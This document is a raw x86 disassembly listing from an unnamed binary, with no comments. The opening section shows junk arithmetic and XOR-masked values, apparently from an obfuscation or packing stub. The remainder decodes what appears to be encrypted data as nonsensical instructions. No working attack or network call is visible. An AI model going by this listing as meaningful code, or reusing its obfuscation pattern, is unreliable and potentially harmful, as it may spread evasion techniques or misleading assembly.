  41d444:	sub    DWORD PTR ds:0x42a2ae,0x4e6d
  41d44e:	sub    edx,esi
  41d450:	xor    edx,eax
  41d452:	sbb    DWORD PTR ds:0x42a2c6,0x8d4
  41d45c:	mov    DWORD PTR [ebp-0x5c],edx
  41d45f:	dec    DWORD PTR ds:0x42a2c2
  41d465:	mov    edx,DWORD PTR [ebp-0x10]
  41d468:	xor    DWORD PTR ds:0x42a2a2,0x42a286
  41d472:	mov    ebx,DWORD PTR [ebp-0x8]
  41d475:	and    DWORD PTR ds:0x42a2ca,0x42a292
  41d47f:	xor    edx,eax
  41d481:	xor    ebx,eax
  41d483:	add    DWORD PTR ds:0x42a29a,0x42a2c2
  41d48d:	sub    edx,ebx
  41d48f:	sub    edx,esi
  41d491:	xor    edx,eax
  41d493:	mov    DWORD PTR [ebp-0x10],edx
  41d496:	mov    edx,DWORD PTR [ebp-0x14]
  41d499:	mov    DWORD PTR [ebp+0x8],edx
  41d49c:	jmp    0x41f8db
  41d4a1:	sbb    edx,ebx
  41d4a3:	mov    edx,DWORD PTR [ebp+0x8]
  41d4a6:	sbb    ebx,DWORD PTR ds:0x42a25a
  41d4ac:	mov    ebx,DWORD PTR [ebp-0x8]
  41d4af:	xor    edx,eax
  41d4b1:	xor    ebx,eax
  41d4b3:	or     DWORD PTR ds:0x42a2f6,0x42a266
  41d4bd:	sub    edx,ebx
  41d4bf:	movzx  ebx,BYTE PTR ds:0x42a2a6
  41d4c6:	sbb    ebx,DWORD PTR ds:0x42a262
  41d4cc:	mov    DWORD PTR ds:0x42a2a6,ebx
  41d4d2:	sub    edx,esi
  41d4d4:	xor    edx,eax
  41d4d6:	mov    DWORD PTR [ebp+0x8],edx
  41d4d9:	mov    DWORD PTR ds:0x42a2b2,0x1f
  41d4e3:	cmp    DWORD PTR ds:0x42a2b2,0x0
  41d4ea:	je     0x41d526
  41d4f0:	cmp    DWORD PTR ds:0x42a2b2,0x21
  41d4f7:	jle    0x41d526
  41d4fd:	jmp    0x41d512
  41d502:	push   0x1ea3
  41d507:	push   0x42a29e
  41d50c:	call   DWORD PTR ds:0x42a3ce
  41d512:	xor    edx,edx
  41d514:	xor    edx,DWORD PTR ds:0x42a2b2
  41d51a:	dec    edx
  41d51b:	mov    DWORD PTR ds:0x42a2b2,edx
  41d521:	jmp    0x41d4e3
  41d526:	mov    edx,DWORD PTR [ebp+0x8]
  41d529:	mov    ebx,DWORD PTR [ebp-0x58]
  41d52c:	add    edx,0x5708fa
  41d532:	imul   edx,ebx
  41d535:	mov    DWORD PTR [ebp-0x58],edx
  41d538:	mov    edx,DWORD PTR [ebp+0x8]
  41d53b:	mov    ebx,DWORD PTR [ebp-0x54]
  41d53e:	add    edx,0x64f898
  41d544:	or     edx,ebx
  41d546:	mov    DWORD PTR [ebp-0x54],edx
  41d549:	jmp    0x41f8a1
  41d54e:	in     al,0xd
  41d550:	in     al,0xc4
  41d552:	xchg   BYTE PTR [esi-0x72a2f23c],al
  41d558:	retf   0x55e7
  41d55b:	cmc    
  41d55c:	xchg   edi,eax
  41d55d:	(bad)  
  41d55e:	dec    ebp
  41d55f:	fstp   TBYTE PTR [ebx+eax*4+0x46]
  41d563:	pop    esi
  41d564:	add    DWORD PTR [ebx-0x771c6326],0x2f
  41d56b:	cmp    ebp,DWORD PTR [ebx-0x3570f325]
  41d571:	jg     0x41d522
  41d573:	out    0x16,eax
  41d575:	mov    dh,BYTE PTR [edx*1+0x7af4f556]
  41d57c:	add    al,0x28
  41d57e:	sahf   
  41d57f:	int    0x85
  41d581:	mov    edx,0xac7f6d26
  41d586:	mov    ds:0x503f054d,eax
  41d58b:	enter  0xc8e5,0xee
  41d58f:	mov    BYTE PTR [edi],bh
  41d591:	call   0x2bfd:0xd4dd424e
  41d598:	pop    ecx
  41d599:	repnz mov dh,0x47
  41d59c:	jecxz  0x41d5e3
  41d59e:	cmc    
  41d59f:	lea    edi,[ecx]
  41d5a1:	jnp    0x41d5c1
  41d5a3:	(bad)  
  41d5a4:	cs mov dl,0xff
  41d5a7:	cmp    eax,DWORD PTR [edi]
  41d5a9:	add    DWORD PTR [ecx],0x33d28dea
  41d5af:	mov    al,ds:0x160b2091
  41d5b4:	dec    esp
  41d5b5:	jno    0x41d5aa
  41d5b7:	pop    ebx
  41d5b8:	fwait
  41d5b9:	mov    bl,0x48
  41d5bb:	xchg   ebx,eax
  41d5bc:	loope  0x41d548
  41d5be:	xchg   ebp,eax
  41d5bf:	cmp    BYTE PTR [esi+0x4c],0x84
  41d5c3:	jle    0x41d61b
  41d5c5:	xchg   ebx,eax
  41d5c6:	pop    ss
  41d5c7:	and    DWORD PTR [esi+0x14f630b7],edx
  41d5cd:	cs enter 0x51da,0x9
  41d5d2:	int    0xe4
  41d5d4:	pop    ecx
  41d5d5:	in     al,0x4d
  41d5d7:	adc    edx,DWORD PTR [eax+0x19]
  41d5da:	mov    ecx,DWORD PTR [ecx-0x3a]
  41d5dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5de:	add    ax,0xb5f
  41d5e2:	stc    
  41d5e3:	sbb    BYTE PTR [edx],ch
  41d5e5:	sbb    al,0xbd
  41d5e7:	mov    eax,0x86d630b2
  41d5ec:	test   BYTE PTR [esi],0x65
  41d5ef:	dec    edx
  41d5f0:	jae    0x41d62b
  41d5f2:	pushf  
  41d5f3:	(bad)
  41d5f6:	inc    esi
  41d5f7:	int3   
  41d5f8:	repz and DWORD PTR [ecx-0x1a],edx
  41d5fc:	outs   dx,DWORD PTR ds:[esi]
  41d5fd:	sbb    al,0xec
  41d5ff:	(bad)  
  41d600:	(bad)  
  41d601:	xor    bl,BYTE PTR [ecx-0x11]
  41d604:	out    0x7d,al
  41d606:	(bad)  
  41d607:	mov    ebx,0x11cbb96a
  41d60c:	xchg   esi,eax
  41d60d:	adc    eax,DWORD PTR [edx+edi*2-0x772388df]
  41d614:	dec    esp
  41d615:	idiv   DWORD PTR [eax-0x7f8519a5]
  41d61b:	xor    ah,BYTE PTR [edx]
  41d61d:	sub    ebp,DWORD PTR [edx-0x123df0ef]
  41d623:	xchg   dh,al
  41d625:	push   ebx
  41d626:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d627:	xchg   eax,edi
  41d629:	arpl   sp,bx
  41d62b:	mov    ebp,0x732ae6ca
  41d630:	dec    ebp
  41d631:	call   esi
  41d633:	cmp    DWORD PTR [eax+0x31],eax
  41d636:	add    eax,0xc1383e78
  41d63b:	rcr    BYTE PTR [edi-0x5],1
  41d63e:	stc    
  41d63f:	jno    0x41d5da
  41d641:	rcl    eax,0xdf
  41d644:	jns    0x41d5d8
  41d646:	adc    esi,DWORD PTR [eax]
  41d648:	out    0x44,al
  41d64a:	mov    ds:0x5608e095,eax
  41d64f:	mov    ebp,0x6985bcd7
  41d654:	xlat   BYTE PTR ds:[ebx]
  41d655:	mov    bl,0xe6
  41d657:	outs   dx,DWORD PTR ds:[esi]
  41d658:	sbb    ch,BYTE PTR [eax]
  41d65a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d65b:	jmp    0x5955:0x10c74ce
  41d662:	sbb    ebp,DWORD PTR [eax-0x2c]
  41d665:	sub    al,0xe3
  41d667:	sub    DWORD PTR [ecx-0x287862c9],0x60
  41d66e:	arpl   di,di
  41d670:	fcom   DWORD PTR [esi-0x6b]
  41d673:	mov    ah,0xcf
  41d675:	(bad)  
  41d676:	push   0x4e
  41d678:	fcmovu st,st(3)
  41d67a:	iret   
  41d67b:	xor    bh,0xa7
  41d67e:	mov    esi,0xa20849f5
  41d683:	es ja  0x41d69f
  41d686:	pop    es
  41d687:	adc    BYTE PTR ds:0xfc8c2241,ch
  41d68d:	sub    bl,dl
  41d68f:	pop    ebx
  41d690:	mov    bh,0xa0
  41d692:	fdiv   DWORD PTR [esi+0x3b91c45c]
  41d698:	mov    ecx,0xa3e33ea
  41d69d:	mov    esi,0xd99a02fb
  41d6a2:	jae    0x41d6cc
  41d6a4:	test   al,0x34
  41d6a6:	adc    edi,ecx
  41d6a8:	scas   al,BYTE PTR es:[edi]
  41d6a9:	ins    DWORD PTR es:[edi],dx
  41d6aa:	sub    eax,0x13ea9e7
  41d6af:	sbb    esi,DWORD PTR [ebx+0x69]
  41d6b2:	pop    esi
  41d6b3:	leave  
  41d6b4:	pop    ss
  41d6b5:	repnz mov ds:0x3d2a4f95,eax
  41d6bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6bc:	in     eax,0xf3
  41d6be:	repz ret 
  41d6c0:	aaa    
  41d6c1:	sub    edx,DWORD PTR [edx+0x72]
  41d6c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6c5:	and    DWORD PTR [edx],ebp
  41d6c7:	lahf   
  41d6c8:	dec    ebp
  41d6c9:	dec    esi
  41d6ca:	out    dx,eax
  41d6cb:	mov    WORD PTR [eax+0x6c337e9a],?
  41d6d1:	out    dx,al
  41d6d2:	adc    BYTE PTR [ebp-0x13],cl
  41d6d5:	mov    bh,0x43
  41d6d7:	xchg   ebp,eax
  41d6d8:	sahf   
  41d6d9:	das    
  41d6da:	push   es
  41d6db:	xchg   ebp,eax
  41d6dc:	adc    al,0x6f
  41d6de:	mov    ds:0x3f86f6a0,eax
  41d6e3:	add    BYTE PTR [esp+esi*8-0x25],ah
  41d6e7:	fisttp DWORD PTR [ecx+0x3a]
  41d6ea:	aas    
  41d6eb:	mov    dl,BYTE PTR [eax]
  41d6ed:	in     eax,dx
  41d6ee:	jb     0x41d695
  41d6f0:	xchg   DWORD PTR [ecx+0x3e],edi
  41d6f3:	aas    
  41d6f4:	xor    BYTE PTR [esi+0x345560a4],dh
  41d6fa:	lods   al,BYTE PTR ds:[esi]
  41d6fb:	fwait
  41d6fc:	and    DWORD PTR [edi+0x45],ebx
  41d6ff:	(bad)  
  41d701:	loope  0x41d744
  41d703:	retf   0xc6d8
  41d706:	out    0x1d,eax
  41d708:	mov    bl,0xab
  41d70a:	(bad)  
  41d70b:	data16 in al,0x49
  41d70e:	mov    ch,0xad
  41d710:	mov    eax,0xbc2dcff0
  41d715:	xchg   BYTE PTR [ebp+0x5de80bd1],ch
  41d71b:	and    eax,DWORD PTR [eax+edx*4]
  41d71e:	cmp    ah,BYTE PTR [ecx-0x6]
  41d721:	pushf  
  41d722:	sub    DWORD PTR [ebx],0x63
  41d725:	or     al,0x7e
  41d727:	mov    dh,0xd7
  41d729:	jg     0x41d7a9
  41d72b:	mov    ds:0x59824bb4,al
  41d730:	dec    esi
  41d731:	inc    edi
  41d732:	xor    DWORD PTR [eax+0x323b1eef],esp
  41d738:	jge    0x41d6c0
  41d73a:	sbb    ecx,DWORD PTR [esi-0x48c6d2fa]
  41d740:	mov    WORD PTR [edi+0x43d5004e],cs
  41d746:	sub    cl,BYTE PTR [ebp+0x19]
  41d749:	and    esi,DWORD PTR [edi]
  41d74b:	dec    ecx
  41d74c:	shl    BYTE PTR [esi-0x36],1
  41d74f:	sub    BYTE PTR ds:0xa91abb36,al
  41d755:	cmp    al,0x27
  41d757:	push   edi
  41d758:	mov    eax,0x917c5e76
  41d75d:	or     eax,0x11b32d91
  41d762:	push   ecx
  41d763:	dec    ebp
  41d764:	mov    gs,WORD PTR [eax+ecx*2-0x1986cc9b]
  41d76b:	lahf   
  41d76c:	or     cl,BYTE PTR [ecx+0x1c0347c3]
  41d772:	push   esp
  41d773:	adc    edx,ebp
  41d775:	fucomi st,st(0)
  41d777:	aas    
  41d778:	mov    dl,0x77
  41d77a:	mov    eax,ds:0x687c06c
  41d77f:	push   0x29b737ca
  41d784:	idiv   BYTE PTR [edx+0x1caac0c9]
  41d78a:	mov    ds:0x37a4a1fd,eax
  41d78f:	cdq    
  41d790:	mov    ds:0x9115e73b,eax
  41d795:	jmp    DWORD PTR [edi+0x356d989]
  41d79b:	(bad)  
  41d79c:	lock aad 0xd7
  41d79f:	fwait
  41d7a0:	test   BYTE PTR [eax+eax*1],ch
  41d7a3:	call   FWORD PTR [edi-0x7b]
  41d7a6:	bound  ecx,QWORD PTR [ecx+edx*4]
  41d7a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7aa:	fninit 
  41d7ac:	mov    esi,DWORD PTR [edx+0x1a]
  41d7af:	fcom   QWORD PTR [ecx+0x53]
  41d7b2:	repz pop eax
  41d7b4:	xlat   BYTE PTR ds:[ebx]
  41d7b5:	ss xchg edi,eax
  41d7b7:	inc    ecx
  41d7b8:	sbb    al,0xc8
  41d7ba:	sti    
  41d7bb:	fsub   DWORD PTR [ecx]
  41d7bd:	push   ecx
  41d7be:	cld    
  41d7bf:	xchg   ebp,eax
  41d7c0:	fs repnz int 0xfe
  41d7c4:	jmp    0xcaf3f0ca
  41d7c9:	xor    eax,DWORD PTR [edx]
  41d7cb:	sub    ebp,DWORD PTR [eax]
  41d7cd:	jbe    0x41d799
  41d7cf:	add    eax,0xea0f7c46
  41d7d4:	xor    bl,bl
  41d7d6:	repnz sub DWORD PTR [esi+esi*8+0x5d],ebx
  41d7db:	sti    
  41d7dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7dd:	jns    0x41d826
  41d7df:	shr    ecx,1
  41d7e1:	inc    ebx
  41d7e2:	retf   0x593e
  41d7e5:	jae    0x41d78a
  41d7e7:	sub    al,0x6c
  41d7e9:	arpl   WORD PTR [edi+0x15043275],cx
  41d7ef:	mov    ebx,0x86801cff
  41d7f4:	dec    edx
  41d7f5:	test   DWORD PTR ss:0x9cdc7157,0xd3abe5d9
  41d800:	sar    BYTE PTR [ebx-0x5d2361aa],0xd6
  41d807:	mov    fs,ecx
  41d809:	inc    ebx
  41d80a:	mov    bh,0x97
  41d80c:	dec    edi
  41d80d:	aad    0x65
  41d80f:	sti    
  41d810:	dec    edi
  41d811:	into   
  41d812:	arpl   sp,di
  41d814:	mov    bl,0xb
  41d816:	push   ebx
  41d817:	mov    ebp,0x23624455
  41d81c:	mov    ch,0xfa
  41d81e:	xchg   edx,eax
  41d81f:	call   FWORD PTR [eax+0x53]
  41d822:	and    dl,bl
  41d824:	jmp    0x4a0b:0xe2b873ff
  41d82b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d82c:	daa    
  41d82d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d82e:	jbe    0x41d85c
  41d830:	hlt    
  41d831:	lock xchg esi,eax
  41d833:	mov    bh,0x6e
  41d835:	fistp  QWORD PTR [ebp-0x5e4db3ea]
  41d83b:	leave  
  41d83c:	xchg   esi,eax
  41d83d:	aas    
  41d83e:	mov    ecx,DWORD PTR [ebx+0x6b]
  41d841:	pop    esp
  41d842:	dec    ebp
  41d843:	stos   DWORD PTR es:[edi],eax
  41d844:	sbb    bh,BYTE PTR [edi+edx*8-0x6bcecdc8]
  41d84b:	pop    esp
  41d84c:	mov    dl,0x67
  41d84e:	fsub   QWORD PTR [ebp-0x53]
  41d851:	sub    esp,DWORD PTR gs:[ebp+0x212079d6]
  41d858:	push   0x72cdb377
  41d85d:	inc    ecx
  41d85e:	fist   DWORD PTR [esi-0x58]
  41d861:	and    esp,ebx
  41d863:	ror    DWORD PTR [edi+0x46],0x3a
  41d867:	adc    esi,0x9e49c7b
  41d86d:	outs   dx,DWORD PTR ds:[esi]
  41d86e:	mov    dl,0xfb
  41d870:	xchg   edi,eax
  41d871:	hlt    
  41d872:	out    dx,al
  41d873:	mov    dh,0x6e
  41d875:	xor    cl,BYTE PTR [edi]
  41d877:	aas    
  41d878:	pop    DWORD PTR [edi]
  41d87a:	sti    
  41d87b:	lds    esp,FWORD PTR [esi]
  41d87d:	les    eax,FWORD PTR [edi+ebx*4-0x76]
  41d881:	pop    esi
  41d882:	push   ss
  41d883:	mov    ecx,0x7621b7cc
  41d888:	mov    ebp,0xf7e73df4
  41d88d:	push   edi
  41d88e:	sbb    edx,DWORD PTR [edi-0x6c]
  41d891:	bound  ecx,QWORD PTR [ecx+ebx*4]
  41d894:	push   ebx
  41d895:	mov    al,0x65
  41d897:	cdq    
  41d898:	retf   0xa43e
  41d89b:	mov    ah,0xdb
  41d89d:	xlat   BYTE PTR ds:[ebx]
  41d89e:	neg    BYTE PTR [ebp-0x5d4fa942]
  41d8a4:	cdq    
  41d8a5:	jmp    0x62fb905e
  41d8aa:	push   ecx
  41d8ab:	sbb    bl,ah
  41d8ad:	xchg   ecx,eax
  41d8ae:	test   al,0xb4
  41d8b0:	in     eax,0x55
  41d8b2:	or     eax,0x1a877a64
  41d8b7:	xor    al,0xa7
  41d8b9:	out    0xf9,eax
  41d8bb:	dec    ebx
  41d8bc:	mov    bh,0x15
  41d8be:	mov    gs,WORD PTR ds:0xe3c6d969
  41d8c4:	mov    esp,0x694457dc
  41d8c9:	jge    0x41d8ff
  41d8cb:	enter  0x7de6,0xb1
  41d8cf:	test   BYTE PTR [edx-0x7d],bh
  41d8d2:	push   edx
  41d8d3:	in     eax,0xd3
  41d8d5:	scas   al,BYTE PTR es:[edi]
  41d8d6:	cwde   
  41d8d7:	push   0xffffffc2
  41d8d9:	ja     0x41d85c
  41d8db:	ja     0x41d92a
  41d8dd:	int3   
  41d8de:	or     edx,ebx
  41d8e0:	pop    esp
  41d8e1:	arpl   WORD PTR [edi+eiz*4],bx
  41d8e4:	sbb    DWORD PTR [edx+eiz*8+0x3e],ebx
  41d8e8:	cmp    edi,DWORD PTR [edi+0x24232bc3]
  41d8ee:	dec    edx
  41d8ef:	fistp  DWORD PTR [edi]
  41d8f1:	test   eax,0x771b7c31
  41d8f6:	bound  ebp,QWORD PTR [edx]
  41d8f8:	mov    bl,0xdd
  41d8fa:	addr16 (bad) 
  41d8fc:	ins    DWORD PTR es:[edi],dx
  41d8fd:	mov    bl,0x6
  41d8ff:	fsub   DWORD PTR [edx-0x7fc9292e]
  41d905:	psrld  mm3,QWORD PTR [esi+0x72]
  41d909:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d90a:	test   al,0x26
  41d90c:	or     dh,BYTE PTR [edi+ebp*8]
  41d90f:	mov    dl,0xec
  41d911:	jge    0x41d977
  41d913:	stc    
  41d914:	fcomi  st,st(5)
  41d916:	test   BYTE PTR [ebx],cl
  41d918:	jne    0x41d8e9
  41d91a:	cli    
  41d91b:	mov    dl,0x0
  41d91d:	jae    0x41d984
  41d91f:	xor    ecx,DWORD PTR [ecx-0x29f8e785]
  41d925:	push   ds
  41d926:	jge    0x41d925
  41d928:	in     eax,0xc2
  41d92a:	imul   ebp,DWORD PTR [edx-0x54],0x8e912e35
  41d931:	add    DWORD PTR [edx-0x1aa50cc4],edx
  41d937:	inc    esi
  41d938:	xchg   esp,eax
  41d939:	shl    BYTE PTR [eax-0xc],0x24
  41d93d:	repnz xchg ebp,eax
  41d93f:	jb     0x41d8d1
  41d941:	fdivr  QWORD PTR [ebx]
  41d943:	in     al,dx
  41d944:	mov    bl,0x30
  41d946:	xor    eax,0x620f2f55
  41d94b:	cmp    ebp,DWORD PTR ds:0xd45a6617
  41d951:	pop    eax
  41d952:	lea    esp,[ebx-0x8]
  41d955:	jmp    0x41d8ff
  41d957:	sub    al,0x8d
  41d959:	pop    ss
  41d95a:	lds    ebp,FWORD PTR [bx+0x5b72]
  41d95f:	pop    edx
  41d960:	xchg   ecx,eax
  41d961:	or     DWORD PTR [ebx-0x4fbac83b],0x29
  41d968:	imul   edi,DWORD PTR [ebx-0xe],0xffffffb3
  41d96c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d96d:	popf   
  41d96e:	add    al,0x1a
  41d970:	sar    DWORD PTR [ebx-0x5cc8cddc],cl
  41d976:	je     0x41d935
  41d978:	outs   dx,BYTE PTR ds:[esi]
  41d979:	jle    0x41d8fb
  41d97b:	jmp    0x41d9f5
  41d97d:	popf   
  41d97e:	push   ss
  41d97f:	cmp    al,0x9e
  41d981:	jmp    0x5d1:0x9a789314
  41d988:	xor    BYTE PTR [ebx+0x15b3c9e2],cl
  41d98e:	or     BYTE PTR [ebp+0x2d6953dc],0xc4
  41d995:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d996:	jl     0x41d93b
  41d998:	int    0x6b
  41d99a:	mov    cl,BYTE PTR ds:0xeea67f1b
  41d9a0:	mov    dh,0xe6
  41d9a2:	xchg   esi,eax
  41d9a3:	jmp    0x78086b2a
  41d9a8:	or     edi,DWORD PTR [eax-0x354b2367]
  41d9ae:	mov    ebp,0x1d5509c6
  41d9b3:	std    
  41d9b4:	pop    ebx
  41d9b5:	jle    0x41da04
  41d9b7:	jmp    0x42d9:0xe1ab2bd8
  41d9be:	xor    eax,ebp
  41d9c0:	cmp    esp,DWORD PTR [eax]
  41d9c2:	jo     0x41d9af
  41d9c4:	inc    esp
  41d9c5:	fs jge 0x41d95d
  41d9c8:	mov    bh,0x5b
  41d9ca:	jecxz  0x41d963
  41d9cc:	adc    BYTE PTR [ecx-0x6b],bl
  41d9cf:	test   al,0x27
  41d9d1:	imul   BYTE PTR [edi-0x3920e918]
  41d9d7:	jae    0x41da04
  41d9d9:	fdivr  DWORD PTR [ebx]
  41d9db:	xor    ebp,DWORD PTR [ecx+0x5ca90cbe]
  41d9e1:	(bad)  
  41d9e2:	mov    eax,0xf9e13bb1
  41d9e7:	data16 test dl,cl
  41d9ea:	cld    
  41d9eb:	xchg   esi,eax
  41d9ec:	arpl   WORD PTR fs:[ebp-0x3138635b],di
  41d9f3:	sbb    bh,0x56
  41d9f6:	jae    0x41d9e9
  41d9f8:	out    0x25,al
  41d9fa:	jg     0x41da13
  41d9fc:	push   edi
  41d9fd:	int    0x20
  41d9ff:	and    dh,ch
  41da01:	push   ebp
  41da02:	xor    al,0x63
  41da04:	sub    cl,BYTE PTR [ebp-0x4f02ec99]
  41da0a:	pusha  
  41da0b:	pusha  
  41da0c:	je     0x41da6c
  41da0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da10:	xor    ah,bh
  41da12:	int    0xc8
  41da14:	out    0xc0,eax
  41da16:	xchg   BYTE PTR [edi],ah
  41da18:	aad    0x55
  41da1a:	test   BYTE PTR [ebp+0x14ea8673],bl
  41da20:	lock inc edi
  41da22:	sbb    BYTE PTR [edx],bh
  41da24:	lds    edx,FWORD PTR [ecx+0x374f7394]
  41da2a:	pop    eax
  41da2b:	or     eax,0x8cbd0100
  41da30:	or     DWORD PTR [eax-0x2fc36444],ecx
  41da36:	loop   0x41d9cd
  41da38:	stos   DWORD PTR es:[edi],eax
  41da39:	cmp    BYTE PTR [ecx+0x26],cl
  41da3c:	fdivr  QWORD PTR [esi+0x7a]
  41da3f:	out    0xe7,al
  41da41:	xor    DWORD PTR [edx],ebx
  41da43:	loope  0x41da17
  41da45:	bnd jne 0x41da39
  41da48:	in     al,dx
  41da49:	icebp  
  41da4a:	cmovbe ebp,DWORD PTR [ebp+0x5a7d01bf]
  41da51:	sbb    al,0x15
  41da53:	pop    ecx
  41da54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da55:	push   ebx
  41da56:	popf   
  41da57:	call   0xa3ffdbb
  41da5c:	push   ebp
  41da5d:	es or  al,0xcb
  41da60:	jmp    0xaa7fca87
  41da65:	dec    BYTE PTR [eax-0x2f]
  41da68:	inc    eax
  41da69:	enter  0xcae7,0x7d
  41da6d:	ret    
  41da6e:	test   eax,0x9eb0a95d
  41da73:	cmc    
  41da74:	aad    0xdb
  41da76:	lods   al,BYTE PTR ds:[esi]
  41da77:	push   edx
  41da78:	dec    esp
  41da79:	js     0x41da79
  41da7b:	xadd   DWORD PTR [ebx+0x0],ebx
  41da7f:	mov    ecx,0xfdb369fd
  41da84:	fnstcw WORD PTR [ebx]
  41da86:	sub    al,0x35
  41da88:	jmp    0x1b14:0xe9a8931
  41da8f:	push   ecx
  41da90:	jae    0x41da1f
  41da92:	push   eax
  41da93:	ins    BYTE PTR es:[edi],dx
  41da94:	xchg   edi,eax
  41da95:	aad    0x8a
  41da97:	ins    BYTE PTR es:[edi],dx
  41da98:	test   BYTE PTR [eax-0x1e6b5f4d],dl
  41da9e:	(bad)  
  41daa0:	cmp    eax,0xe3da3f29
  41daa5:	dec    di
  41daa7:	xchg   ebx,eax
  41daa8:	hlt    
  41daa9:	shl    DWORD PTR [eax+0xc],1
  41daac:	adc    BYTE PTR [edx+ebx*1+0x42],bl
  41dab0:	(bad)  
  41dab2:	push   ecx
  41dab3:	dec    eax
  41dab4:	test   BYTE PTR [edx],0xdd
  41dab7:	inc    ebx
  41dab8:	ja     0x41dac5
  41daba:	retf   
  41dabb:	push   esp
  41dabc:	mov    ds:0xd968b6d4,al
  41dac1:	call   0x348a1d25
  41dac6:	test   BYTE PTR [esi],ch
  41dac8:	loope  0x41db01
  41daca:	jno    0x41da90
  41dacc:	in     eax,dx
  41dacd:	repz or al,0xc5
  41dad0:	das    
  41dad1:	or     bl,BYTE PTR [esi+0x78]
  41dad4:	ret    0x4d93
  41dad7:	pop    es
  41dad8:	xchg   DWORD PTR [ebp+0x2e3ac000],ebx
  41dade:	sbb    cl,dl
  41dae0:	mov    esi,0x8558ad77
  41dae5:	xor    al,0xbd
  41dae7:	mov    bh,0x19
  41dae9:	xor    eax,DWORD PTR [esi-0x173f123b]
  41daef:	inc    eax
  41daf0:	lds    esi,FWORD PTR [ebx+0x0]
  41daf3:	xchg   ebp,eax
  41daf4:	inc    edi
  41daf5:	xchg   DWORD PTR [eax-0x57],edx
  41daf8:	push   eax
  41daf9:	xchg   edx,eax
  41dafa:	xor    DWORD PTR [ebp+0x3dce1548],ebx
  41db00:	loop   0x41daad
  41db02:	add    DWORD PTR [eax-0x71],esp
  41db05:	pop    edi
  41db06:	je     0x41db62
  41db08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db09:	mov    cl,0x68
  41db0b:	in     eax,0xfd
  41db0d:	lods   al,BYTE PTR ds:[esi]
  41db0e:	sbb    BYTE PTR [edx-0x2adc797e],0x3b
  41db15:	enter  0x2af,0xe4
  41db19:	cmp    ebx,0xffffffe0
  41db1c:	jb     0x41db60
  41db1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db1f:	xchg   ebx,eax
  41db20:	scas   eax,DWORD PTR es:[edi]
  41db21:	test   BYTE PTR [edx+0x9],ch
  41db24:	mov    bh,0xcb
  41db26:	sti    
  41db27:	inc    eax
  41db28:	mov    ebp,DWORD PTR [ebp+0x726f7586]
  41db2e:	test   al,0x73
  41db30:	jmp    0x41db73
  41db32:	xchg   ebp,eax
  41db33:	(bad)  
  41db34:	shl    dl,1
  41db36:	xchg   edi,eax
  41db37:	pop    eax
  41db38:	mov    ch,0x22
  41db3a:	ds xchg ebp,eax
  41db3c:	psraw  mm1,QWORD PTR [edi]
  41db3f:	adc    al,0xd
  41db41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db42:	mov    ah,0x8f
  41db44:	mov    eax,ds:0x579caa5c
  41db49:	outs   dx,DWORD PTR ds:[esi]
  41db4a:	call   0x1c5588b5
  41db4f:	ret    0x1cb2
  41db52:	push   esi
  41db53:	ret    0x53a9
  41db56:	cmp    BYTE PTR [eax+ebp*8],bl
  41db59:	mov    cl,0x88
  41db5b:	xor    al,0xa5
  41db5d:	xlat   BYTE PTR ds:[ebx]
  41db5e:	mov    edx,0x8a8b5c1d
  41db63:	stos   BYTE PTR es:[edi],al
  41db64:	xchg   BYTE PTR [esi-0x7a187f3e],cl
  41db6a:	loope  0x41dbab
  41db6c:	xchg   ecx,eax
  41db6d:	adc    DWORD PTR [esi],esi
  41db6f:	fcom   DWORD PTR [ebx+ebx*8]
  41db72:	int3   
  41db73:	cli    
  41db74:	xor    DWORD PTR [esi+0x7f],eax
  41db77:	es pop esi
  41db79:	iret   
  41db7a:	into   
  41db7b:	fldcw  WORD PTR [edx+0x2210771c]
  41db81:	and    bh,BYTE PTR [ebx+0x1797bf73]
  41db87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db88:	and    bh,al
  41db8a:	jns    0x41dbd3
  41db8c:	mov    ss,WORD PTR [edx]
  41db8e:	adc    bl,BYTE PTR [esi+0x73c98d81]
  41db94:	outs   dx,BYTE PTR ds:[esi]
  41db95:	mov    dl,ah
  41db97:	pushf  
  41db98:	cmp    BYTE PTR [ebp-0x50],0x4c
  41db9c:	aam    0x75
  41db9e:	mov    ebp,0xf581aec5
  41dba3:	adc    edi,esi
  41dba5:	js     0x41dbcc
  41dba7:	jno    0x41dbc6
  41dba9:	xor    ch,ch
  41dbab:	arpl   bp,dx
  41dbad:	idiv   DWORD PTR [edx]
  41dbaf:	addr16 mov cs:0x76f5,al
  41dbb4:	ror    BYTE PTR [esi],0xf6
  41dbb7:	(bad)  
  41dbb8:	and    al,0x8c
  41dbba:	jmp    0xb1d1190b
  41dbbf:	ins    BYTE PTR es:[edi],dx
  41dbc0:	cli    
  41dbc1:	pop    eax
  41dbc2:	fdiv   DWORD PTR [ecx+0x10523ab5]
  41dbc8:	arpl   WORD PTR [ebp+0x51f9f2b],bp
  41dbce:	pop    ds
  41dbcf:	out    0xfb,eax
  41dbd1:	into   
  41dbd2:	mov    al,ds:0x72026772
  41dbd7:	clc    
  41dbd8:	in     al,0xf6
  41dbda:	jmp    0xd8f60160
  41dbdf:	les    eax,FWORD PTR [ebx]
  41dbe1:	xor    eax,0xfa14a31d
  41dbe6:	sbb    eax,0x3c617e99
  41dbeb:	ds mov dh,0x1a
  41dbee:	mul    ecx
  41dbf0:	mov    al,0x62
  41dbf2:	data16 or dl,0x52
  41dbf6:	adc    bl,dh
  41dbf8:	pop    esi
  41dbf9:	and    BYTE PTR [esi],0x9a
